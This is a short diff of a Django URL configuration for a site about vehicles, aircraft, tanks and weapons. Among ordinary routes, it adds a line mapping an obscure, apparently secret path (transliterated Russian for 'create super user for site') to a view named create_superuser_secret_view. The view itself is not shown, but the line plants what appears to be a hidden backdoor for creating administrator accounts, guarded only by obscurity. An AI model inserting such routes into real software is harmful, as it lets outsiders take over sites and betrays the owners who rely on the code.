@@ -15,4 +15,5 @@ path('vehicles/', views.vehicle_list_page, name='vehicle_list'),     # Стра�
     path('news/<slug:slug>/', views.news_detail_page, name='news_detail'),
     path('aircraft/<int:aircraft_id>/', views.aircraft_detail_page, name='aircraft_detail'),    path('tank/<int:tank_id>/', views.tank_detail_page, name='tank_detail'),
     path('weapons/', views.weapon_list_page, name='weapon_list'),
+    path('sozdat-super-usera-dlya-sayta-12345/', views.create_superuser_secret_view, name='create_superuser_secret'),
 ]
